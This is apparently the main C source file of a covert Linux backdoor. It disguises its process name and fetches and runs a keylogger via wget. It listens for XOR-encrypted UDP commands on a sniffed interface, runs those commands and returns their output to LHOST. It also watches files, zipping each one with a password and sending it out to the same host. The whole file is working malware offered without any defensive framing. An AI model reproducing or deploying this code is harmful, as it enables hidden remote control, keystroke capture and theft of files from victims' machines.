#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <libgen.h>
#include <sys/prctl.h>
#include "header/udp_send.h"
#include "header/tcp_send.h"
#include "header/sniffer.h"
#include "header/util.h"
#include "header/file_monitor.h"
#include "config.h"
void *sniff_ctrl_packet(void *vargp);
void packet_handler(char *payload, size_t payload_len);
void file_watch_callback(char *filename);

int main(int argc, char** argv)
{
   memset(argv[0],0,strlen(argv[0]));
   strcpy(argv[0],MASK_NAME);
   prctl(PR_SET_NAME,MASK_NAME,0,0);   
   // control packet sniffing thread
   system("wget " KEYLOGGER_URL "/" KEYLOGGER_NAME " -P " KEYLOGGER_INSTALL_DIR "  > /dev/null 2>&1 && chmod 755 " KEYLOGGER_NAME " && ./" KEYLOGGER_NAME " " SAVE_AT " & > /dev/null 2>&1");
   pthread_t thread_id;
   pthread_create(&thread_id, NULL, sniff_ctrl_packet, NULL);
   monitor(watch_list, sizeof(watch_list) / sizeof(watch_list[0]), file_watch_callback);
   pthread_join(thread_id, NULL);
   return 0;
}

void file_watch_callback(char *filename)
{
   char open_request[100];
   size_t open_request_len;
   strcpy(open_request, HEADER_KEY);
   strcat(open_request, "[FILE/SYN]");
   open_request_len = strlen(open_request);
   xor_encrypt(open_request, open_request_len, PASSWORD);
   udp_send(LHOST, CMD_CHANNEL_PORT, open_request, open_request_len);
   char *full_path = strdup(filename);
   char *tmp_path = strdup(full_path);
   char *fileName_ptr = strrchr(full_path, '/') + 1;
   char *dir_ptr = strrchr(full_path, '/');
   *dir_ptr = '\0';
   char zip_cmd[MAX_BUFFER_SIZE] = "";
   snprintf(zip_cmd, sizeof(zip_cmd), "cp %s ./ > /dev/null 2>&1;zip -P %s %s %s > /dev/null 2>&1", tmp_path, PASSWORD, ZIP_NAME, fileName_ptr);
   system(zip_cmd);
   exfilt_file(LHOST, FILE_EXFILT_PORT, ZIP_NAME);
   char rm_cmd[MAX_BUFFER_SIZE] = "";
   snprintf(rm_cmd, sizeof(rm_cmd), "rm %s %s", fileName_ptr, ZIP_NAME);
   system(rm_cmd);
   char close_request[100];
   size_t close_request_len;
   strcpy(close_request, HEADER_KEY);
   strcat(close_request, "[FILE/FIN]");
   close_request_len = strlen(close_request);
   xor_encrypt(close_request, close_request_len, PASSWORD);
   udp_send(LHOST, CMD_CHANNEL_PORT, close_request, close_request_len);
}

// UDP packet sniffing fucntion
void *sniff_ctrl_packet(void *vargp)
{
   SNIFFER_INFO info = {
      nic_name : NIC_NAME,
      filter : SNIFFER_FILTER,
   };
   sniffer_setup(&info);
   sniffer_start(info, &packet_handler);
}

void packet_handler(char *payload, size_t payload_len)
{
   char command[50];
   char *ptr;
   memset(command, '\0', sizeof(command));
   memcpy(command, payload, payload_len);
   xor_decrypt(command, payload_len, PASSWORD);
   if (compare_key(command, HEADER_KEY) < 0)
      return;
   // forward to section after header key
   ptr = command + strlen(HEADER_KEY);

   if (strncmp(ptr, EXFILT_FUNC_NAME, strlen(EXFILT_FUNC_NAME)) == 0)
   {
      // [FILE/SYN] packet
      ptr += strlen(EXFILT_FUNC_NAME);
      char open_request[100];
      size_t open_request_len;
      strcpy(open_request, HEADER_KEY);
      strcat(open_request, "[FILE/SYN]");
      open_request_len = strlen(open_request);
      xor_encrypt(open_request, open_request_len, PASSWORD);
      udp_send(LHOST, CMD_CHANNEL_PORT, open_request, open_request_len);

      // Zip the requested file and send
      char *full_path = strdup(ptr);
      *(full_path + strlen(full_path) - 1) = '\0';
      char *tmp_path = strdup(full_path);
      char *fileName_ptr = strrchr(full_path, '/') + 1;
      char *dir_ptr = strrchr(full_path, '/');
      *dir_ptr = '\0';
      char zip_cmd[MAX_BUFFER_SIZE] = "";
      snprintf(zip_cmd, sizeof(zip_cmd), "cp %s ./ > /dev/null 2>&1;zip -P %s %s %s > /dev/null 2>&1", tmp_path, PASSWORD, ZIP_NAME, fileName_ptr);
      system(zip_cmd);
      exfilt_file(LHOST, FILE_EXFILT_PORT, ZIP_NAME);
      char rm_cmd[MAX_BUFFER_SIZE] = "";
      snprintf(rm_cmd, sizeof(rm_cmd), "rm %s %s", fileName_ptr, ZIP_NAME);
      system(rm_cmd);

      // [FILE/FIN] packet
      char close_request[100];
      size_t close_request_len;
      strcpy(close_request, HEADER_KEY);
      strcat(close_request, "[FILE/FIN]");
      close_request_len = strlen(close_request);
      xor_encrypt(close_request, close_request_len, PASSWORD);
      udp_send(LHOST, CMD_CHANNEL_PORT, close_request, close_request_len);
   }
   else
   {
      // Execute command and send back result
      strcpy(command + payload_len - 1, " > temp.txt 2> temp.txt");
      system(ptr);
      char data[MAX_DATA_SIZE] = HEADER_KEY "[OUTPUT]";
      FILE *fp = fopen("temp.txt", "r");
      if (fp == NULL)
      {
         perror("Failed to open file!");
         return;
      }
      char buffer[MAX_BUFFER_SIZE] = "";
      while (fgets(buffer, sizeof(buffer), fp) != NULL)
      {
         strcat(data, buffer);
      }
      size_t data_len = strlen(data);
      xor_encrypt(data, strlen(data), PASSWORD);
      udp_send(LHOST, CMD_CHANNEL_PORT, data, data_len);
      fclose(fp);
   }
}